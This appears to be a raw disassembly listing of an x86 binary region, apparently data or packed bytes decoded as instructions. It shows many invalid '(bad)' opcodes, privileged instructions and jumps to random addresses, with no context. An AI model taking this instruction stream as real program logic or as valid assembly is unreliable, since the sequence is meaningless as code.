  40f225:	cmp    BYTE PTR [ebp-0x68720202],bl
  40f22b:	xchg   ebx,eax
  40f22c:	dec    ebp
  40f22d:	(bad)  
  40f22e:	sti    
  40f22f:	popa   
  40f230:	push   ebp
  40f231:	(bad)  
  40f232:	std    
  40f233:	test   BYTE PTR [eax+0x181a223],0x0
  40f23a:	sti    
  40f23b:	or     DWORD PTR [esi-0x2],ecx
  40f23e:	in     eax,0x66
  40f240:	scas   al,BYTE PTR es:[edi]
  40f241:	imul   ebp,DWORD PTR [ebp-0x1],0x3a
  40f245:	not    ch
  40f247:	fsub   DWORD PTR [esi-0x2527e801]
  40f24d:	xor    DWORD PTR [ebx],esp
  40f24f:	sbb    BYTE PTR [ecx-0x38],ah
  40f252:	or     ebp,0x9817863
  40f258:	jmp    0xdf2e5460
  40f25d:	jp     0x40f26b
  40f25f:	test   eax,0xda2e95e6
  40f264:	popa   
  40f265:	or     BYTE PTR [edx+0x58],dh
  40f268:	sub    al,0x2
  40f26a:	fild   DWORD PTR [esp+eax*1]
  40f26d:	lock dec ebp
  40f26f:	(bad)  
  40f271:	(bad)  
  40f272:	loope  0x40f2c7
  40f274:	test   BYTE PTR [ebx],0x0
  40f277:	bound  eax,QWORD PTR [edx+0x736c5c47]
  40f27d:	out    dx,al
  40f27e:	xchg   ebp,eax
  40f27f:	push   ds
  40f280:	fisubr DWORD PTR [edx+0x49]
  40f283:	arpl   WORD PTR [eax-0x45],sp
  40f286:	daa    
  40f287:	jbe    0x40f237
  40f289:	stos   DWORD PTR es:[edi],eax
  40f28a:	daa    
  40f28b:	jbe    0x40f26f
  40f28d:	xor    bh,BYTE PTR fs:0xbd5d1673
  40f294:	retf   0x3e7
  40f297:	sub    ebx,DWORD PTR gs:[esp+eax*1+0x1a42b5d]
  40f29f:	and    edi,DWORD PTR [eax-0x21]
  40f2a2:	cli    
  40f2a3:	sub    eax,0x1e83215f
  40f2a8:	xlat   BYTE PTR ds:[ebx]
  40f2a9:	ror    dh,cl
  40f2ab:	pop    esp
  40f2ac:	sub    esi,DWORD PTR [eax*1+0x22c2b55]
  40f2b3:	and    edi,DWORD PTR [eax-0x21]
  40f2b6:	cli    
  40f2b7:	and    eax,0x6983a7a7
  40f2bc:	mov    ebp,0xa3d912fa
  40f2c1:	add    dh,ah
  40f2c3:	push   ebp
  40f2c4:	xor    al,BYTE PTR [edi-0x164275db]
  40f2ca:	lds    esi,FWORD PTR [eax-0x67]
  40f2cd:	inc    eax
  40f2ce:	jb     0x40f257
  40f2d0:	xor    ch,bh
  40f2d2:	xchg   esi,eax
  40f2d3:	sub    al,0xf3
  40f2d5:	xchg   DWORD PTR ds:0x9243c18a,esp
  40f2db:	add    ah,ch
  40f2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2de:	shr    BYTE PTR [ecx],0x29
  40f2e1:	call   0x6240:0x997084e9
  40f2e8:	push   edi
  40f2e9:	pop    edi
  40f2ea:	rcl    BYTE PTR [edx+0x2e],1
  40f2ed:	jecxz  0x40f2a5
  40f2ef:	mov    ah,0x5e
  40f2f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2f2:	shr    BYTE PTR [ecx+0x12515fe],0x75
  40f2f9:	sub    al,0x43
  40f2fb:	jmp    0x40f323
  40f2fd:	js     0x40f307
  40f2ff:	jb     0x40f328
  40f301:	(bad)  
  40f303:	inc    edx
  40f304:	add    BYTE PTR [ebp+0x42],ah
  40f307:	adc    eax,0x72428770
  40f30c:	mov    DWORD PTR [edi+0x61d7eeca],esi
  40f312:	mov    al,ds:0x887221be
  40f317:	popf   
  40f318:	jge    0x40f2d7
  40f31a:	or     eax,0x554aa947
  40f31f:	test   eax,0x1b841c61
  40f324:	jmp    0x282ff09b
  40f329:	jecxz  0x40f36f
  40f32b:	mov    ecx,0xe9432c0f
  40f330:	sbb    al,0x6c
  40f332:	test   BYTE PTR ds:0xe900d8b6,cl
  40f338:	pusha  
  40f339:	pusha  
  40f33a:	dec    esp
  40f33b:	add    BYTE PTR [edi+0x6d],bl
  40f33e:	mov    BYTE PTR [eax+eax*1+0x5f],dl
  40f342:	test   DWORD PTR [eax-0x784290bc],ecx
  40f348:	ins    BYTE PTR es:[edi],dx
  40f349:	pop    edi
  40f34a:	imul   ecx,DWORD PTR [esi],0xd6c784
  40f350:	add    BYTE PTR [eax+0x2c],dl
  40f353:	sub    eax,0x14c17f89
  40f358:	prefetch (bad)
  40f359:	or     eax,0x4f8b10e1
  40f35e:	rcr    DWORD PTR [eax],0x89
  40f361:	jg     0x40f324
  40f363:	and    BYTE PTR [ebx],dh
  40f365:	retf   
  40f366:	pushf  
  40f367:	mov    BYTE PTR [edi+ebx*4-0x2f],al
  40f36b:	cmp    eax,ecx
  40f36d:	xchg   eax,ecx
  40f36f:	cmp    DWORD PTR [edi-0x69],ebx
  40f372:	je     0x40f2f6
  40f374:	mov    ch,0x86
  40f376:	aad    0x0
  40f378:	bswap  ebp
  40f37a:	xlat   BYTE PTR ds:[ebx]
  40f37b:	mov    DWORD PTR [edi+ebx*2+0x71],edi
  40f37f:	inc    edx
  40f380:	paddsw mm4,mm0
  40f383:	cmp    BYTE PTR [ebx+0x14cc1d7],cl
  40f389:	dec    ebx
  40f38a:	fnsave [edi]
  40f38c:	inc    esp
  40f38d:	pop    ds
  40f38e:	mov    ebp,0x67bd840d
  40f393:	std    
  40f394:	inc    eax
  40f396:	mov    eax,ds:0xf40b2c21
  40f39b:	inc    ecx
  40f39c:	and    al,0x17
  40f39e:	loop   0x40f35f
  40f3a0:	jle    0x40f418
  40f3a2:	loop   0x40f36e
  40f3a4:	str    WORD PTR [edi+0x4ffe646]
  40f3ab:	pop    edx
  40f3ac:	jns    0x40f3d2
  40f3ae:	pop    edi
  40f3af:	aad    0xd
  40f3b1:	test   ebx,eax
  40f3b3:	ins    DWORD PTR es:[edi],dx
  40f3b4:	std    
  40f3b5:	jmp    DWORD PTR [edx-0x5]
  40f3b8:	inc    eax
  40f3b9:	mov    BYTE PTR [esi+0x183af4d6],bl
  40f3bf:	push   0x8262bd7e
  40f3c4:	add    DWORD PTR [ebx],edi
  40f3c6:	cmp    eax,0xf282fc16
  40f3cb:	add    BYTE PTR [ecx],0x0
  40f3ce:	pop    ebp
  40f3cf:	adc    BYTE PTR [ecx],al
  40f3d1:	mov    eax,DWORD PTR [esi-0x6a]
  40f3d4:	cmc    
  40f3d5:	push   cs
  40f3d6:	hlt    
  40f3d7:	jle    0x40f3e2
  40f3d9:	mov    esi,esi
  40f3db:	xchg   esi,eax
  40f3dc:	mov    ebp,0xa826200
  40f3e1:	inc    esp
  40f3e2:	jle    0x40f386
  40f3e4:	aad    0x5
  40f3e6:	and    ecx,eax
  40f3e8:	pop    es
  40f3e9:	retf   0x4916
  40f3ec:	js     0x40f379
  40f3ee:	inc    esi
  40f3ef:	inc    edx
  40f3f0:	add    al,BYTE PTR [eax]
  40f3f2:	(bad)  
  40f3f3:	jmp    0x40f3ba
  40f3f5:	and    edx,DWORD PTR [edx+0x3]
  40f3f8:	into   
  40f3f9:	and    ecx,DWORD PTR [edx-0x7e]
  40f3fc:	cld    
  40f3fd:	test   dl,bh
  40f3ff:	push   ds
  40f400:	dec    ebp
  40f401:	(bad)  
  40f402:	sub    DWORD PTR [edx-0x6f8e7e04],edi
  40f408:	add    DWORD PTR [eax],eax
  40f40a:	add    cl,ch
  40f40c:	cmc    
  40f40d:	and    eax,0x182635c
  40f412:	inc    eax
  40f413:	(bad)  ds:0x30923425
  40f419:	dec    esp
  40f41a:	mov    bl,0x7e
  40f41c:	add    al,BYTE PTR ds:[eax]
  40f41f:	(bad)  
  40f420:	jmp    0x40f458
  40f422:	(bad)  
  40f423:	out    dx,al
  40f424:	xchg   ebp,eax
  40f425:	lods   eax,DWORD PTR ds:[esi]
  40f426:	add    BYTE PTR [edx-0x7e],ah
  40f429:	mov    ah,0xfe
  40f42b:	into   
  40f42c:	xchg   ebp,eax
  40f42d:	lods   eax,DWORD PTR ds:[esi]
  40f42e:	add    BYTE PTR [edx-0x27],ah
  40f431:	out    0x4a,eax
  40f433:	shl    DWORD PTR [ebx+edi*1+0x38d96205],1
  40f43a:	jg     0x40f464
  40f43c:	cmp    DWORD PTR [edx+eiz*2-0x14],0x54446c6f
  40f444:	push   esi
  40f445:	jg     0x40f445
  40f447:	(bad)  [edi+0x62]
  40f44a:	js     0x40f3cd
  40f44c:	sbb    ecx,ebp
  40f44e:	add    esp,DWORD PTR [edx+0x64]
  40f451:	sub    esp,DWORD PTR [eax]
  40f453:	mov    fs,WORD PTR [ebx+eiz*8]
  40f456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f457:	or     ecx,0x2fca891a
  40f45d:	hlt    
  40f45e:	add    esp,DWORD PTR [edx+0x5c]
  40f461:	push   es
  40f462:	enter  0x62a5,0x6b
  40f466:	and    BYTE PTR [edx],ah
  40f468:	(bad)  
  40f46a:	add    ecx,DWORD PTR [esi]
  40f46c:	popa   
  40f46d:	mov    dl,0x2c
  40f46f:	add    BYTE PTR [edi],dl
  40f471:	push   ebp
  40f472:	sbb    al,BYTE PTR [ebp+eax*2+0x62]
  40f476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f478:	cmp    bl,BYTE PTR [eax]
  40f47a:	aam    0xfa
  40f47c:	out    0xe5,eax
  40f47e:	dec    esi
  40f47f:	dec    ebx
  40f480:	ins    BYTE PTR es:[edi],dx
  40f481:	sbb    DWORD PTR [edi+0x726f6450],0xe9198178
  40f48b:	add    esp,DWORD PTR [edx-0x80]
  40f48e:	mov    edi,0xda6f4c4a
  40f493:	inc    ebx
  40f494:	test   DWORD PTR [eax-0x5d],esp
  40f497:	pop    ds
  40f498:	push   esi
  40f499:	mov    dl,0x1f
  40f49b:	enter  0xb281,0xae
  40f49f:	xlat   BYTE PTR ds:[ebx]
  40f4a0:	pop    esp
  40f4a1:	pop    edx
  40f4a2:	jae    0x40f49c
  40f4a4:	and    eax,0x6091ee6f
  40f4a9:	sbb    al,BYTE PTR [ecx]
  40f4ab:	mov    al,0xd5
  40f4ad:	mov    edx,0x28dde20
  40f4b2:	adc    al,0xe9
  40f4b4:	popa   
  40f4b5:	bound  eax,QWORD PTR [ebp+eax*1-0xe]
  40f4b9:	scas   al,BYTE PTR es:[edi]
  40f4ba:	xchg   DWORD PTR ds:0xa839c542,ebp
  40f4c0:	sbb    edx,DWORD PTR [ebx+0x5ae8b339]
  40f4c6:	fwait
  40f4c7:	(bad)  
  40f4c8:	sub    BYTE PTR [edi-0x7f],ch
  40f4cb:	xor    eax,0xde00b582
  40f4d0:	loop   0x40f4a3
  40f4d2:	or     eax,0x626100e9
  40f4d7:	shl    DWORD PTR [eax-0x3],0xba
  40f4db:	adc    dl,dl
  40f4dd:	ja     0x40f4be
  40f4df:	mov    edi,DWORD PTR [esi]
  40f4e1:	popa   
  40f4e2:	fld    DWORD PTR [eax]
  40f4e4:	ret    0x2f8
  40f4e7:	push   cs
  40f4e8:	push   0xffffffe6
  40f4ea:	outs   dx,BYTE PTR ds:[esi]
  40f4eb:	std    
  40f4ec:	jmp    0xb0421989
  40f4f1:	int    0xba
  40f4f3:	and    ch,bl
  40f4f5:	arpl   WORD PTR [edx],bx
  40f4f7:	inc    eax
  40f4f8:	and    bh,BYTE PTR [edx+esi*8]
  40f4fb:	call   0x40fae262
  40f500:	call   0xadcace66
  40f505:	inc    ebp
  40f506:	leave  
  40f507:	cmp    DWORD PTR [ebp-0x19ff3e83],0x2ee70ce2
  40f511:	cwde   
  40f512:	mov    bl,0xd8
  40f514:	neg    bh
  40f516:	aad    0x13
  40f518:	jmp    0xcdc5577e
  40f51d:	std    
  40f51e:	fadd   DWORD PTR [eax]
  40f520:	jmp    0x855646
  40f525:	pop    ss
  40f526:	ficom  WORD PTR [eax+0x56]
  40f529:	sbb    al,0x5f
  40f52b:	and    DWORD PTR [edx+ecx*1-0x26],ebx
  40f52f:	add    BYTE PTR [ebx+0x24b22376],cl
  40f535:	lahf   
  40f536:	fiadd  DWORD PTR [eax]
  40f538:	add    BYTE PTR [eax],al
  40f53a:	xor    al,0x20
  40f53c:	mov    dl,0x24
  40f53e:	das    
  40f53f:	fiadd  DWORD PTR [eax]
  40f541:	add    BYTE PTR [ecx+ecx*2],bl
  40f544:	and    DWORD PTR [edx+edi*8-0x27],ebx
  40f548:	add    BYTE PTR [ecx+0x50],dl
  40f54b:	lods   al,BYTE PTR ds:[esi]
  40f54c:	in     eax,0xa2
  40f54e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f54f:	pop    ds
  40f550:	inc    DWORD PTR [ebp-0x527b9005]
  40f556:	rcr    cl,cl
  40f558:	add    BYTE PTR [ebx+0x140b94f],cl
  40f55e:	retf   
  40f55f:	(bad)  [ecx+0x49dda744]
  40f565:	cmp    edi,DWORD PTR [edi-0x47]
  40f568:	adc    BYTE PTR [ebx+0x5e],dh
  40f56b:	adc    dh,BYTE PTR [edx-0x7e2674ec]
  40f571:	jg     0x40f5f2
  40f573:	(bad)  [ecx+0x95578c]
  40f579:	add    BYTE PTR [ebx+0x323b859d],cl
  40f57f:	mov    eax,DWORD PTR [ecx-0x776ac4cd]
  40f585:	inc    edi
  40f586:	mov    edi,0x4c7c45e2
  40f58b:	repz je 0x40f58d
  40f58e:	mov    WORD PTR [edx],fs
  40f590:	jmp    0xff638ce2
  40f595:	mov    ecx,edi
  40f597:	mov    ecx,0xd94b0140
  40f59c:	out    0x68,eax
  40f59e:	add    BYTE PTR [edx-0x3d],ah
  40f5a1:	inc    edi
  40f5a2:	(bad)  
  40f5a3:	pop    ebp
  40f5a4:	add    al,0xae
  40f5a6:	add    BYTE PTR [ebp-0x54],dl
  40f5a9:	mov    ebp,0xfce12301
  40f5ae:	or     dh,BYTE PTR [edx]
  40f5b0:	xor    BYTE PTR [ecx-0x78],al
  40f5b3:	mov    dh,0x96
  40f5b5:	and    DWORD PTR [eax-0x25],eax
  40f5b8:	mov    esi,0x35e12420
  40f5bd:	add    al,0xe9
  40f5bf:	jmp    0xbe44:0x5d000182
  40f5c6:	add    BYTE PTR [ebx],ah
  40f5c8:	mov    ds:0xd62688f9,eax
  40f5cd:	and    al,0xf
  40f5cf:	or     al,0xbe
  40f5d1:	push   es
  40f5d2:	or     DWORD PTR [esi],esp
  40f5d4:	(bad)  
  40f5d5:	and    al,0x33
  40f5d7:	mov    ds:0x7123c602,al
  40f5dc:	ret    0xd57b
  40f5df:	gs out dx,al
  40f5e1:	inc    ecx
  40f5e2:	jmp    0x4cd9:0x3f418f91
  40f5e9:	jp     0x40f62e
  40f5eb:	inc    esi
  40f5ec:	mov    cl,BYTE PTR [ecx-0x371c6a02]
  40f5f2:	inc    esp
  40f5f3:	jns    0x40f5c5
  40f5f5:	adc    eax,eax
  40f5f7:	and    ah,bh
  40f5f9:	xor    edx,ebp
  40f5fb:	(bad)  
  40f5fc:	iret   
  40f5fd:	inc    esp
  40f5fe:	aas    
  40f5ff:	jmp    0x40f63f
  40f601:	sbb    eax,0xa4d90028
  40f606:	pop    esp
  40f607:	jmp    0xd6a6:0x88c1c231
  40f60e:	sbb    al,0xf
  40f610:	or     al,0x3d
  40f612:	add    al,cl
  40f614:	inc    edx
  40f615:	jp     0x40f691
  40f617:	inc    ebx
  40f618:	jle    0x40f5f3
  40f61a:	xbegin 0xfb2b0c17
  40f620:	mov    eax,ds:0x177cc7b5
  40f625:	xor    BYTE PTR [ebp+0x76],0xa3
  40f629:	xchg   esp,eax
  40f62a:	jb     0x40f65f
  40f62c:	loopne 0x40f6a4
  40f62e:	call   0xcbf6a7ad
  40f633:	clc    
  40f634:	iret   
  40f635:	dec    eax
  40f636:	dec    edi
  40f637:	mov    al,0x45
  40f639:	fdecstp 
  40f63b:	test   DWORD PTR [ebp+0x39],edi
  40f63e:	ss (bad) 
  40f640:	cmc    
  40f641:	adc    al,0x6d
  40f643:	inc    esp
  40f644:	pop    esp
  40f645:	adc    eax,0x62262024
  40f64a:	sub    esp,DWORD PTR [eax]
  40f64c:	sbb    ah,0x75
  40f64f:	rcl    ebp,0x14
  40f652:	popa   
  40f653:	mov    al,0x81
  40f655:	leave  
  40f656:	pusha  
  40f657:	rol    BYTE PTR [ecx-0x7e278f2f],0xcd
  40f65e:	xor    ah,BYTE PTR fs:[ebx+ebx*2+0x6a]
  40f663:	add    esp,DWORD PTR [edx-0x27]
  40f666:	push   0x44
  40f668:	add    BYTE PTR [ebx+0x6cf77f57],ch
  40f66e:	push   esp
  40f66f:	jbe    0x40f66a
  40f671:	xchg   ebp,eax
  40f672:	imul   esi,DWORD PTR [esi+0x20],0xffffffe7
  40f676:	leave  
  40f677:	ins    DWORD PTR es:[edi],dx
  40f678:	les    eax,FWORD PTR [ebp+0x38c427a6]
  40f67e:	mov    esi,ebp
  40f680:	ja     0x40f684
  40f682:	fsub   st,st(7)
  40f684:	add    ebx,ebx
  40f686:	adc    al,0x4
  40f688:	lock fcomp DWORD PTR [ebx]
  40f68b:	aam    0xa
  40f68d:	cmp    ebx,ebx
  40f68f:	push   0xffffff9f
  40f691:	imul   ebx,ecx,0x0
  40f694:	jmp    0xe959e279
  40f699:	adc    eax,0x49be89cd
  40f69e:	add    eax,0x1b3da68c
  40f6a3:	push   eax
  40f6a4:	bound  ebp,QWORD PTR [ecx+0x72]
  40f6a7:	daa    
  40f6a8:	fstp   DWORD PTR [esi-0x27]
  40f6ab:	sub    DWORD PTR [ecx],0x15
  40f6ae:	push   esi
  40f6af:	jne    0x40f68b
  40f6b1:	popa   
  40f6b2:	(bad)  [ecx-0x16369263]
  40f6b8:	(bad)  
  40f6b9:	push   0x4f221d1a
  40f6be:	jecxz  0x40f6dd
  40f6c0:	jae    0x40f722
  40f6c2:	scas   eax,DWORD PTR es:[edi]
  40f6c3:	inc    ebp
  40f6c4:	add    eax,0xa931c313
  40f6c9:	and    DWORD PTR [edx-0x2bff1abb],esi
  40f6cf:	push   esi
  40f6d0:	push   ebp
  40f6d1:	fisub  DWORD PTR [ecx-0x27]
  40f6d4:	mov    ch,BYTE PTR [edx]
  40f6d6:	scas   eax,DWORD PTR es:[di]
  40f6d8:	inc    ebp
  40f6d9:	cld    
  40f6da:	int3   
  40f6db:	push   esi
  40f6dc:	dec    ecx
  40f6dd:	cli    
  40f6de:	popa   
  40f6df:	(bad)  [ecx+0x41c5822d]
  40f6e5:	sub    BYTE PTR [edi],ch
  40f6e7:	push   ds
  40f6e8:	and    eax,0x7e9f58f5
  40f6ed:	fs ds gs add ch,cl
  40f6f2:	popa   
  40f6f3:	pop    esi
  40f6f4:	inc    ebp
  40f6f5:	add    eax,0x91399769
  40f6fa:	mov    WORD PTR [ebx+0x28],ss
  40f6fd:	pop    edx
  40f6fe:	and    al,0x6b
  40f700:	add    DWORD PTR [ebx+0x16],eax
  40f703:	jns    0x40f707
  40f705:	jmp    0xaa019d6b
  40f70a:	out    0x15,al
  40f70c:	and    eax,0xd0df3f00
  40f711:	xsaves [eax-0x20c40001]
  40f718:	pop    ebp
  40f719:	ins    BYTE PTR es:[edi],dx
  40f71a:	and    al,0x57
  40f71c:	or     bl,dh
  40f71e:	test   BYTE PTR [ebx],dl
  40f720:	movzx  ecx,BYTE PTR [eax-0x69]
  40f724:	cmp    al,0x41
  40f727:	call   0x10:0x21850f21
  40f72e:	or     edx,DWORD PTR [edi-0xb]
  40f731:	or     al,0x0
  40f733:	xchg   ebp,eax
  40f734:	data16 cmp al,0x6
  40f738:	call   0x0:0xd67e3d23
  40f73f:	hlt    
  40f740:	jmp    0x7737:0xd60b12e5
  40f747:	fwait
  40f748:	fs test bh,bl
  40f74b:	jmp    0x8fcbf825
  40f750:	mov    ecx,0x99524014
  40f755:	and    DWORD PTR [eax+edx*8],edx
  40f758:	pop    ss
  40f759:	jl     0x40f718
  40f75b:	mov    ds:0xcbffffee,al
  40f760:	loopne 0x40f7bf
  40f762:	ins    BYTE PTR es:[edi],dx
  40f763:	pop    eax
  40f764:	push   cs
  40f765:	jle    0x40f7a2
  40f767:	rcr    DWORD PTR [edx-0xa1fbc1f],0x32
  40f76e:	ror    BYTE PTR [ebx-0x12],0x41
  40f772:	and    al,0xaf
  40f774:	loopne 0x40f746
  40f776:	sysret 
  40f778:	cmp    edi,0xffffffff
  40f77b:	jnp    0x40f75d
  40f77d:	pop    ebp
  40f77e:	ins    BYTE PTR es:[edi],dx
  40f77f:	je     0x40f7d9
  40f781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f782:	repnz adc al,0x14
  40f785:	movzx  esp,BYTE PTR [edx+0x7f]
  40f789:	rol    BYTE PTR [edx-0x7c0b8796],0xf9
  40f790:	test   BYTE PTR [ecx],al
  40f792:	add    cl,ah
  40f794:	sbb    ah,BYTE PTR ds:0x4e6000f
  40f79a:	repz inc DWORD PTR [ebp+0x76]
  40f79e:	mov    eax,ds:0xf4733dff
  40f7a3:	sbb    ebp,0x64
  40f7a6:	add    DWORD PTR [eax],eax
  40f7a8:	fnstenv [esi]
  40f7aa:	sbb    eax,0xc0f9a214
  40f7af:	and    esi,DWORD PTR [esi-0x65]
  40f7b2:	aas    
  40f7b3:	jge    0x40f7e0
  40f7b5:	retf   0x212
  40f7b8:	bound  esi,QWORD PTR [edx+0x10]
  40f7bb:	shl    BYTE PTR [edx+0x5623c0f9],0xbb
  40f7c2:	xor    al,0xe
  40f7c4:	out    0xd3,al
  40f7c6:	add    al,BYTE PTR [eax]
  40f7c8:	(bad)  
  40f7c9:	retf   
  40f7ca:	mov    ds:0xa7f3556b,eax
  40f7cf:	icebp  
  40f7d0:	fstp   QWORD PTR [edi-0x4c9e4a0c]
  40f7d6:	jg     0x40f7cf
  40f7d8:	pop    ebx
  40f7d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7da:	hlt    
  40f7db:	or     dl,0xd2
  40f7de:	ror    BYTE PTR [edx],1
  40f7e0:	jg     0x40f7f4
  40f7e2:	add    al,BYTE PTR [eax]
  40f7e4:	bound  esi,QWORD PTR [edi+0x7e]
  40f7e7:	inc    ebx
  40f7e8:	push   eax
  40f7e9:	jb     0x40f7ec
  40f7eb:	mov    ebx,DWORD PTR [esi]
  40f7ed:	sahf   
  40f7ee:	in     eax,dx
  40f7ef:	aas    
  40f7f0:	jmp    0x40f7a8
  40f7f2:	and    BYTE PTR [ecx+ebx*2],dl
  40f7f5:	xor    al,0xc3
  40f7f7:	sar    BYTE PTR [ebx+0x5f],1
  40f7fa:	add    al,BYTE PTR [eax]
  40f7fc:	add    BYTE PTR [edx+0x23],ah
  40f7ff:	inc    ecx
  40f800:	aas    
  40f801:	jmp    0x40f7dc
  40f803:	stos   DWORD PTR es:[edi],eax
  40f804:	pop    ds
  40f805:	dec    esi
  40f806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f807:	aaa    
  40f808:	hlt    
  40f809:	fnstcw WORD PTR [ecx-0x18]
  40f80c:	add    esp,DWORD PTR [edx-0x5c]
  40f80f:	scas   al,BYTE PTR es:[edi]
  40f810:	xlat   BYTE PTR ds:[ebx]
  40f811:	ins    BYTE PTR es:[edi],dx
  40f812:	pop    esp
  40f813:	ficom  WORD PTR [ecx+0x54]
  40f816:	push   0x1c608dee
  40f81b:	imul   ecx,DWORD PTR [ebx+0x5b],0xffffffe5
  40f81f:	rol    DWORD PTR [eax+0x75f6d635],cl
  40f825:	pop    ebp
  40f826:	retf   
  40f827:	out    0x3,eax
  40f829:	outs   dx,DWORD PTR ds:[esi]
  40f82a:	pop    esi
  40f82b:	out    0x3,eax
  40f82d:	(bad)  
  40f82e:	fsub   DWORD PTR [ebx+0x46]
  40f831:	jb     0x40f80c
  40f833:	out    0x78,eax
  40f835:	mov    eax,ds:0xdac3d3bd
  40f83a:	sbb    al,0xcc
  40f83c:	out    dx,eax
  40f83d:	dec    eax
  40f83e:	fwait
  40f83f:	ins    DWORD PTR es:[edi],dx
  40f840:	or     dh,BYTE PTR ss:[ecx]
  40f843:	call   0xa7ed5a4b
  40f848:	(bad)  
  40f849:	ficomp DWORD PTR [esp+ecx*1]
  40f84c:	sbb    BYTE PTR [ecx],ch
  40f84e:	mov    esi,ebx
  40f850:	(bad)  
  40f851:	cli    
  40f852:	(bad)  
  40f854:	add    ebx,DWORD PTR [ecx-0x1eecb3f8]
  40f85a:	mov    BYTE PTR [eax+0x75d7c443],bh
  40f860:	pop    es
  40f861:	add    BYTE PTR [ecx],ah
  40f863:	pop    esp
  40f864:	lahf   
  40f865:	push   cs
  40f866:	gs push ebp
  40f868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f869:	adc    eax,0x3c6ad962
  40f86e:	push   esi
  40f86f:	out    0xe2,eax
  40f871:	add    bh,ah
  40f873:	fsub   st,st(7)
  40f875:	add    esp,DWORD PTR [ebp+0x5e]
  40f878:	xor    eax,0xd96215
  40f87d:	bound  ebx,QWORD PTR [edx-0x10d6eb45]
  40f883:	sbb    esp,DWORD PTR ds:0x7e9974fd
  40f889:	sub    al,0x3f
  40f88b:	stc    
  40f88c:	(bad)  
  40f88d:	call   0xaa01a4f3
  40f892:	out    dx,al
  40f893:	sbb    ah,BYTE PTR ds:0xd9754dd
  40f899:	ins    DWORD PTR es:[edi],dx
  40f89a:	xor    al,0xda
  40f89c:	add    cl,ch
  40f89e:	inc    esp
  40f89f:	or     BYTE PTR [ebp-0x22],ch
  40f8a2:	in     al,0x44
  40f8a4:	or     cl,ch
  40f8a6:	popa   
  40f8a7:	(bad)  
  40f8a8:	mov    dh,0xf2
  40f8aa:	fcomp  QWORD PTR [edi]
  40f8ac:	xor    eax,0xffdad7aa
  40f8b1:	les    esp,FWORD PTR [ebp-0x2a]
  40f8b4:	add    DWORD PTR [ebx+0x7200d96e],0x1a
  40f8bb:	mov    ebx,0x1ad6a914
  40f8c0:	and    eax,0x7e98fcd5
  40f8c5:	rol    DWORD PTR [eax],0x46
  40f8c8:	mov    ebp,0xaa61e8ff
  40f8cd:	shr    BYTE PTR [ecx],0xd7
  40f8d0:	sbb    ah,BYTE PTR ds:0xd96dcf5
  40f8d6:	jne    0x40f953
  40f8d8:	fadd   DWORD PTR [eax]
  40f8da:	jmp    0xe6ae00ab
  40f8df:	fdiv   st(0),st
  40f8e1:	or     cl,ch
  40f8e3:	popa   
  40f8e4:	(bad)  
  40f8e5:	mov    dh,0xf2
  40f8e7:	in     al,0x1f
  40f8e9:	xor    eax,0xffdadc2a
  40f8ee:	int3   
  40f8ef:	pop    ebp
  40f8f0:	(bad)  
  40f8f1:	test   bh,cl
  40f8f3:	jbe    0x40f8ce
  40f8f5:	add    BYTE PTR [eax],al
  40f8f7:	adc    BYTE PTR [esi+0x543b1421],bl
  40f8fd:	inc    ecx
  40f8fe:	and    al,0xa7
  40f900:	addr16 mov edi,0xe8b5d37e
  40f906:	add    BYTE PTR [ebx-0x443fce26],cl
  40f90c:	push   ebp
  40f90d:	inc    ecx
  40f90e:	and    al,0x67
  40f910:	addr16 int 0xf
  40f913:	mov    edi,0x4bfffe04
  40f918:	outs   dx,DWORD PTR ds:[esi]
  40f919:	enter  0x6041,0x7a
  40f91d:	imul   ecx,DWORD PTR [edi],0xffedf6b8
  40f923:	mov    ebx,cs
  40f925:	mov    dh,0xb
  40f927:	mov    al,0x93
  40f929:	xor    DWORD PTR [edx+0x31dd4700],ecx
  40f92f:	leave  
  40f930:	cli    
  40f931:	sahf   
  40f932:	pop    ds
  40f933:	sar    DWORD PTR [ecx+edx*2],0xf9
  40f937:	adc    BYTE PTR [ebx],cl
  40f939:	fimul  DWORD PTR [ecx+0x40ce2744]
  40f93f:	mov    DWORD PTR [edi+0x493b117d],esi
  40f945:	cwde   
  40f946:	aam    0xe9
  40f948:	in     al,0xdc
  40f94a:	add    BYTE PTR [eax],al
  40f94c:	dec    eax
  40f94d:	sbb    eax,0x7137893e
  40f952:	adc    DWORD PTR [ebx],edi
  40f954:	sbb    ecx,eax
  40f956:	mov    WORD PTR [eax+0x3300d9cb],ds
  40f95c:	adc    bl,BYTE PTR [edx-0x37e0a0c6]
  40f962:	sub    DWORD PTR [edx-0x5],0x150fff17
  40f969:	aam    0x89
  40f96b:	inc    edi
  40f96c:	xchg   edi,eax
  40f96d:	push   ebx
  40f96e:	add    DWORD PTR [ecx],eax
  40f970:	bound  eax,QWORD PTR [ebx-0x6ddebfb6]
  40f976:	inc    edx
  40f977:	push   cs
  40f978:	ficomp WORD PTR [ecx]
  40f97a:	adc    eax,0xc8eb6200
  40f97f:	and    ebp,DWORD PTR [esi-0x50]
  40f982:	mov    DWORD PTR [ebx+0x46],eax
  40f985:	mov    esp,?
  40f987:	shl    esp,0xa4
  40f98a:	sub    esp,DWORD PTR [edi+0x31]
  40f98d:	mov    al,0xc4
  40f98f:	mov    BYTE PTR [eax],al
  40f991:	push   ds
  40f992:	aam    0x18
  40f994:	cmp    esi,DWORD PTR [edx]
  40f996:	xchg   edi,eax
  40f997:	fidivr WORD PTR [edx]
  40f999:	mov    ch,0x8e
  40f99b:	adc    BYTE PTR [ebx+0x17bfb],al
  40f9a1:	push   ebp
  40f9a2:	in     al,0xb
  40f9a4:	mov    esp,DWORD PTR [ebp+0x5e89c46e]
  40f9aa:	jno    0x40f991
  40f9ac:	minps  xmm7,xmm5
  40f9af:	test   DWORD PTR [edi],ecx
  40f9b1:	bound  esi,QWORD PTR [edx-0x74]
  40f9b4:	inc    ebx
  40f9b5:	inc    esi
  40f9b6:	outs   dx,BYTE PTR ds:[esi]
  40f9b7:	ror    DWORD PTR [eax+0x3b15969e],0x20
